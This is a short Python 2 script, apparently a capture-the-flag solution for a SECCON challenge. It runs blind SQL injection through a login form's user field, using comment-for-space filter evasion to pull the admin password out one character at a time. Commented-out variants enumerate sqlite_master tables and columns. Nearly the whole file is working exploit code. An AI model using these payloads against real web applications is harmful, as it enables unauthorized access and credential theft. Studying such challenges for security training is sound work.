#!/usr/bin/python  
# -*- coding: utf-8 -*-  
import requests, sys, time  
  
color_s = '\x1b[1;32m'  
color_e = '\x1b[00m'  
result = ""  
  
def sanitize(s, ret=''):  
    s = s.replace(' ','/**/')  
    return s  
  
def do_bsqli(sidx, c):
    #payload = r"' union select '58474452dda5c2bdc1f6869ace2ae9e3"
    payload = r"'UNION/**/SELECT/**/CASE/**/WHEN/**/(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),{0:d},1)='{1}')/**/THEN/**/'58474452dda5c2bdc1f6869ace2ae9e3'/**/END/**/--"
    #payload = r"' union select '58474452dda5c2bdc1f6869ace2ae9e3' select substr(password,{0:d},1) from users where username='admin')='{1}'or'1'='"
    #payload =  r"'or(select substr(group_concat(tbl_name,'/'),{0:d},1) from sqlite_master where type='table')>'{1}'or'1'='"  
    #payload =  r"'or(select substr(group_concat(sql,'/'),{0:d},1) from sqlite_master where tbl_name='users_0x4QM')>'{1}'or'1'='"  
    #payload =  r"'or(select substr(group_concat(name_1QXzP,'/'),{0:d},1) from users_0x4QM)>'{1}"  
    #payload =  r"'or(select substr(group_concat(password_IU3hA,'/'),{0:d},1) from users_0x4QM)>'{1}"  
    postdata = {'pass':'admin', 'login':'Login', 'user':sanitize(payload).format(sidx, c).replace("'''", '"\'"').replace('"""', "'\"'")}  
    cookie = {'CGISESSID':'e9620817a01fafdfe8ea0359fa421280'} 
  
    while True:  
        time.sleep(0.1)  
        try:  
            r = requests.post('http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi', data=postdata, cookies=cookie) 
        except:  
            continue # 接続に失敗したらやり直し  

        break
        #if ("Permission denied, please try again." not in r.text) and ("logged in" not in r.text):  # 接続制限が出たらやり直し  
        #    continue  
        #else:  
        #    break  
  
    if "Error" not in r.text: 
        return True  
    else:
        return False  
  
def bsqli_bsearch(sidx):  
    global result
    for c in xrange(0x20,128):
        if do_bsqli(sidx, chr(c)):
            sys.stdout.write(chr(c))  
            sys.stdout.flush()
            result += chr(c)
            return
  
if __name__ == "__main__":  
    print "[*] start"  
    for sidx in xrange(len(result)+1, 100000):  
      old_result = result  
      bsqli_bsearch(sidx)  
      print "\nresult : '"+ color_s + result + color_e + "'"  
  
      if result == old_result:  
        break  
  
    print "[*] finish! -- final string : '" + color_s + result + color_e + "'"